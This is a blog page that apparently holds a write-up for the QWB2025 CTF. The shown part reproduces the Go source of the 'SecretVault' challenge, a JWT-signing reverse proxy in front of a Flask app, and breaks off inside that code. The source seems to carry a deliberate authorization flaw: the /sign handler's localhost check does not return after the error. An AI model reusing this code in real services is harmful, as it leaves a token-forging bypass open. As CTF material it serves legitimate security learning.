<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='SecretVault go 和 flask进行结合\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 package main import ( "crypto/rand" "encoding/hex" "fmt" "log" "net/http" "net/http/httputil" "strings" "time" "github.com/golang-jwt/jwt/v5" "github.com/gorilla/mux" ) var ( SecretKey = hex.EncodeToString(RandomBytes(32)) ) type AuthClaims struct { jwt.RegisteredClaims UID string `json:"uid"` } func RandomBytes(length int) []byte { b := make([]byte, length) if _, err := rand.Read(b); err != nil { return nil } return b } func SignToken(uid string) (string, error) { t := jwt.NewWithClaims(jwt.SigningMethodHS256, AuthClaims{ UID: uid, RegisteredClaims: jwt.RegisteredClaims{ Issuer: "Authorizer", Subject: uid, ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)), IssuedAt: jwt.NewNumericDate(time.Now()), NotBefore: jwt.NewNumericDate(time.Now()), }, }) tokenString, err := t.SignedString([]byte(SecretKey)) if err != nil { return "", err } return tokenString, nil } func GetUIDFromRequest(r *http.Request) string { authHeader := r.Header.Get("Authorization") if authHeader == "" { cookie, err := r.Cookie("token") if err == nil { authHeader = "Bearer " + cookie.Value } else { return "" } } if len(authHeader) <= 7 || !strings.HasPrefix(authHeader, "Bearer ") { return "" } tokenString := strings.TrimSpace(authHeader[7:]) if tokenString == "" { return "" } token, err := jwt.ParseWithClaims(tokenString, &amp;AuthClaims{}, func(token *jwt.Token) (interface{}, error) { if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok { return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"]) } return []byte(SecretKey), nil }) if err != nil { log.Printf("failed to parse token: %v", err) return "" } claims, ok := token.Claims.(*AuthClaims) if !ok || !token.Valid { log.Printf("invalid token claims") return "" } return claims.UID } func main() { authorizer := &amp;httputil.ReverseProxy{Director: func(req *http.Request) { req.URL.Scheme = "http" req.URL.Host = "127.0.0.1:5000" uid := GetUIDFromRequest(req) log.Printf("Request UID: %s, URL: %s", uid, req.URL.String()) req.Header.Del("Authorization") req.Header.Del("X-User") req.Header.Del("X-Forwarded-For") req.Header.Del("Cookie") if uid == "" { req.Header.Set("X-User", "anonymous") } else { req.Header.Set("X-User", uid) } }} signRouter := mux.NewRouter() signRouter.HandleFunc("/sign", func(w http.ResponseWriter, r *http.Request) { if !strings.HasPrefix(r.RemoteAddr, "127.0.0.1:") { http.Error(w, "Forbidden", http.StatusForbidden) } uid := r.URL.Query().Get("uid") token, err := SignToken(uid) if err != nil { log.Printf("Failed to sign token: %v", err) http.Error(w, "Failed to generate token", http.StatusInternalServerError) return } w.Write([]byte(token)) }).Methods("GET") log.Println("Sign service is running at 127.0.0.1:4444") go func() { if err := http.ListenAndServe("127.0.0.1:4444", signRouter); err != nil { log.Fatal(err) } }() log.Println("Authorizer middleware service is running at :5555") if err := http.ListenAndServe(":5555", authorizer); err != nil { log.Fatal(err) } } 生成随机密钥， 提供一个/sign，接受 ?uid=... 并返回一个用 HS256 签名的 JWT（有效期 1 小时）。/sign只有本机请求允许，admin 的 uid 为 0\n'><title>QWB2025</title><link rel=canonical href=https://baozongwi.xyz/p/qwb-2025/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="QWB2025"><meta property='og:description' content='SecretVault go 和 flask进行结合\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 package main import ( "crypto/rand" "encoding/hex" "fmt" "log" "net/http" "net/http/httputil" "strings" "time" "github.com/golang-jwt/jwt/v5" "github.com/gorilla/mux" ) var ( SecretKey = hex.EncodeToString(RandomBytes(32)) ) type AuthClaims struct { jwt.RegisteredClaims UID string `json:"uid"` } func RandomBytes(length int) []byte { b := make([]byte, length) if _, err := rand.Read(b); err != nil { return nil } return b } func SignToken(uid string) (string, error) { t := jwt.NewWithClaims(jwt.SigningMethodHS256, AuthClaims{ UID: uid, RegisteredClaims: jwt.RegisteredClaims{ Issuer: "Authorizer", Subject: uid, ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)), IssuedAt: jwt.NewNumericDate(time.Now()), NotBefore: jwt.NewNumericDate(time.Now()), }, }) tokenString, err := t.SignedString([]byte(SecretKey)) if err != nil { return "", err } return tokenString, nil } func GetUIDFromRequest(r *http.Request) string { authHeader := r.Header.Get("Authorization") if authHeader == "" { cookie, err := r.Cookie("token") if err == nil { authHeader = "Bearer " + cookie.Value } else { return "" } } if len(authHeader) <= 7 || !strings.HasPrefix(authHeader, "Bearer ") { return "" } tokenString := strings.TrimSpace(authHeader[7:]) if tokenString == "" { return "" } token, err := jwt.ParseWithClaims(tokenString, &amp;AuthClaims{}, func(token *jwt.Token) (interface{}, error) { if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok { return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"]) } return []byte(SecretKey), nil }) if err != nil { log.Printf("failed to parse token: %v", err) return "" } claims, ok := token.Claims.(*AuthClaims) if !ok || !token.Valid { log.Printf("invalid token claims") return "" } return claims.UID } func main() { authorizer := &amp;httputil.ReverseProxy{Director: func(req *http.Request) { req.URL.Scheme = "http" req.URL.Host = "127.0.0.1:5000" uid := GetUIDFromRequest(req) log.Printf("Request UID: %s, URL: %s", uid, req.URL.String()) req.Header.Del("Authorization") req.Header.Del("X-User") req.Header.Del("X-Forwarded-For") req.Header.Del("Cookie") if uid == "" { req.Header.Set("X-User", "anonymous") } else { req.Header.Set("X-User", uid) } }} signRouter := mux.NewRouter() signRouter.HandleFunc("/sign", func(w http.ResponseWriter, r *http.Request) { if !strings.HasPrefix(r.RemoteAddr, "127.0.0.1:") { http.Error(w, "Forbidden", http.StatusForbidden) } uid := r.URL.Query().Get("uid") token, err := SignToken(uid) if err != nil { log.Printf("Failed to sign token: %v", err) http.Error(w, "Failed to generate token", http.StatusInternalServerError) return } w.Write([]byte(token)) }).Methods("GET") log.Println("Sign service is running at 127.0.0.1:4444") go func() { if err := http.ListenAndServe("127.0.0.1:4444", signRouter); err != nil { log.Fatal(err) } }() log.Println("Authorizer middleware service is running at :5555") if err := http.ListenAndServe(":5555", authorizer); err != nil { log.Fatal(err) } } 生成随机密钥， 提供一个/sign，接受 ?uid=... 并返回一个用 HS256 签名的 JWT（有效期 1 小时）。/sign只有本机请求允许，admin 的 uid 为 0\n'><meta property='og:url' content='https://baozongwi.xyz/p/qwb-2025/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:tag' content='go'><meta property='article:tag' content='java'><meta property='article:published_time' content='2025-10-21T22:13:23+08:00'><meta property='article:modified_time' content='2025-10-21T22:13:23+08:00'><meta name=twitter:title content="QWB2025"><meta name=twitter:description content='SecretVault go 和 flask进行结合\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 package main import ( "crypto/rand" "encoding/hex" "fmt" "log" "net/http" "net/http/httputil" "strings" "time" "github.com/golang-jwt/jwt/v5" "github.com/gorilla/mux" ) var ( SecretKey = hex.EncodeToString(RandomBytes(32)) ) type AuthClaims struct { jwt.RegisteredClaims UID string `json:"uid"` } func RandomBytes(length int) []byte { b := make([]byte, length) if _, err := rand.Read(b); err != nil { return nil } return b } func SignToken(uid string) (string, error) { t := jwt.NewWithClaims(jwt.SigningMethodHS256, AuthClaims{ UID: uid, RegisteredClaims: jwt.RegisteredClaims{ Issuer: "Authorizer", Subject: uid, ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)), IssuedAt: jwt.NewNumericDate(time.Now()), NotBefore: jwt.NewNumericDate(time.Now()), }, }) tokenString, err := t.SignedString([]byte(SecretKey)) if err != nil { return "", err } return tokenString, nil } func GetUIDFromRequest(r *http.Request) string { authHeader := r.Header.Get("Authorization") if authHeader == "" { cookie, err := r.Cookie("token") if err == nil { authHeader = "Bearer " + cookie.Value } else { return "" } } if len(authHeader) <= 7 || !strings.HasPrefix(authHeader, "Bearer ") { return "" } tokenString := strings.TrimSpace(authHeader[7:]) if tokenString == "" { return "" } token, err := jwt.ParseWithClaims(tokenString, &amp;AuthClaims{}, func(token *jwt.Token) (interface{}, error) { if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok { return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"]) } return []byte(SecretKey), nil }) if err != nil { log.Printf("failed to parse token: %v", err) return "" } claims, ok := token.Claims.(*AuthClaims) if !ok || !token.Valid { log.Printf("invalid token claims") return "" } return claims.UID } func main() { authorizer := &amp;httputil.ReverseProxy{Director: func(req *http.Request) { req.URL.Scheme = "http" req.URL.Host = "127.0.0.1:5000" uid := GetUIDFromRequest(req) log.Printf("Request UID: %s, URL: %s", uid, req.URL.String()) req.Header.Del("Authorization") req.Header.Del("X-User") req.Header.Del("X-Forwarded-For") req.Header.Del("Cookie") if uid == "" { req.Header.Set("X-User", "anonymous") } else { req.Header.Set("X-User", uid) } }} signRouter := mux.NewRouter() signRouter.HandleFunc("/sign", func(w http.ResponseWriter, r *http.Request) { if !strings.HasPrefix(r.RemoteAddr, "127.0.0.1:") { http.Error(w, "Forbidden", http.StatusForbidden) } uid := r.URL.Query().Get("uid") token, err := SignToken(uid) if err != nil { log.Printf("Failed to sign token: %v", err) http.Error(w, "Failed to generate token", http.StatusInternalServerError) return } w.Write([]byte(token)) }).Methods("GET") log.Println("Sign service is running at 127.0.0.1:4444") go func() { if err := http.ListenAndServe("127.0.0.1:4444", signRouter); err != nil { log.Fatal(err) } }() log.Println("Authorizer middleware service is running at :5555") if err := http.ListenAndServe(":5555", authorizer); err != nil { log.Fatal(err) } } 生成随机密钥， 提供一个/sign，接受 ?uid=... 并返回一个用 HS256 签名的 JWT（有效期 1 小时）。/sign只有本机请求允许，admin 的 uid 为 0\n'><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#secretvault>SecretVault</a></li><li><a href=#ezphp>ezphp</a></li><li><a href=#bbjv>bbjv</a></li><li><a href=#yamcs>Yamcs</a></li><li><a href=#anime>anime</a></li><li><a href=#日志系统>日志系统</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E8%B5%9B%E9%A2%98/>赛题</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/qwb-2025/>QWB2025</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-10-21T22:13:23+08:00>Oct 21, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>16 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 113 天前，文中的内容可能已有所发展或发生改变。</span></div><h2 id=secretvault>SecretVault</h2><p>go 和 flask进行结合</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;crypto/rand&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;encoding/hex&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;net/http&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;net/http/httputil&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;strings&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;time&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/golang-jwt/jwt/v5&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/gorilla/mux&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=nx>SecretKey</span> <span class=p>=</span> <span class=nx>hex</span><span class=p>.</span><span class=nf>EncodeToString</span><span class=p>(</span><span class=nf>RandomBytes</span><span class=p>(</span><span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>AuthClaims</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>jwt</span><span class=p>.</span><span class=nx>RegisteredClaims</span>
</span></span><span class=line><span class=cl>	<span class=nx>UID</span> <span class=kt>string</span> <span class=s>`json:&#34;uid&#34;`</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>RandomBytes</span><span class=p>(</span><span class=nx>length</span> <span class=kt>int</span><span class=p>)</span> <span class=p>[]</span><span class=kt>byte</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>b</span> <span class=o>:=</span> <span class=nb>make</span><span class=p>([]</span><span class=kt>byte</span><span class=p>,</span> <span class=nx>length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>rand</span><span class=p>.</span><span class=nf>Read</span><span class=p>(</span><span class=nx>b</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>b</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>SignToken</span><span class=p>(</span><span class=nx>uid</span> <span class=kt>string</span><span class=p>)</span> <span class=p>(</span><span class=kt>string</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>t</span> <span class=o>:=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nf>NewWithClaims</span><span class=p>(</span><span class=nx>jwt</span><span class=p>.</span><span class=nx>SigningMethodHS256</span><span class=p>,</span> <span class=nx>AuthClaims</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>UID</span><span class=p>:</span> <span class=nx>uid</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nx>RegisteredClaims</span><span class=p>:</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>RegisteredClaims</span><span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>Issuer</span><span class=p>:</span>    <span class=s>&#34;Authorizer&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			<span class=nx>Subject</span><span class=p>:</span>   <span class=nx>uid</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			<span class=nx>ExpiresAt</span><span class=p>:</span> <span class=nx>jwt</span><span class=p>.</span><span class=nf>NewNumericDate</span><span class=p>(</span><span class=nx>time</span><span class=p>.</span><span class=nf>Now</span><span class=p>().</span><span class=nf>Add</span><span class=p>(</span><span class=nx>time</span><span class=p>.</span><span class=nx>Hour</span><span class=p>)),</span>
</span></span><span class=line><span class=cl>			<span class=nx>IssuedAt</span><span class=p>:</span>  <span class=nx>jwt</span><span class=p>.</span><span class=nf>NewNumericDate</span><span class=p>(</span><span class=nx>time</span><span class=p>.</span><span class=nf>Now</span><span class=p>()),</span>
